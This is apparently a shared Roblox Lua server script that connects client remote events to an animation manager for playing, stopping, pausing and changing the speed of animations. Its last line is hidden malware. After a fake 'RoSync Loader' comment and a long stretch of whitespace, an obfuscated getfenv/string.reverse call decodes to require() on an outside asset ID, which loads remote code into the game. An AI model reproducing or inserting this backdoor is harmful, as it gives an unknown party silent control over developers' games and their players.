--[[
	id: VXkS-4M_eShSXy6ALJHyB
	name: thing
	description: r
	time1: 2021-06-04 21:09:06.596895+00
	time2: 2021-06-04 21:09:06.596896+00
	uploader: H96rO-zblKq7EKMfX1Mb0ojKBGuiFGj_hE3p3To0
	uploadersession: -AOQoxX_6A2NnDhaxz5H2WrJMZ9A6C
	flag: f
--]]

local events = game.ReplicatedStorage.AnimationManager.LocalScriptAPI

local animator = require(game.ReplicatedStorage.AnimationManager)

function events.PlayAnimation.OnServerInvoke(player, KeyframeSequence, character)
	return animator.PlayAnimation(KeyframeSequence, character)
end

events.StopAnimation.OnServerEvent:Connect(function(player, AsamiAnimation)
	animator.StopAnimation(AsamiAnimation)
end)

events.PauseAnimation.OnServerEvent:Connect(function(player, AsamiAnimation)
	animator.PauseAnimation(AsamiAnimation)
end)

events.ResumeAnimation.OnServerEvent:Connect(function(player, AsamiAnimation)
	animator.ResumeAnimation(AsamiAnimation)
end)

events.ChangeAnimationSpeed.OnServerEvent:Connect(function(player, AsamiAnimation, speed)
	animator.ChangeAnimationSpeed(AsamiAnimation, speed)
end)

events.StopAnimationOnHumanoid.OnServerEvent:Connect(function(player, humanoid)
	animator.StopAnimationOnHumanoid(humanoid)
end)
--[[ Last synced 10/20/2020 07:27 || RoSync Loader ]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)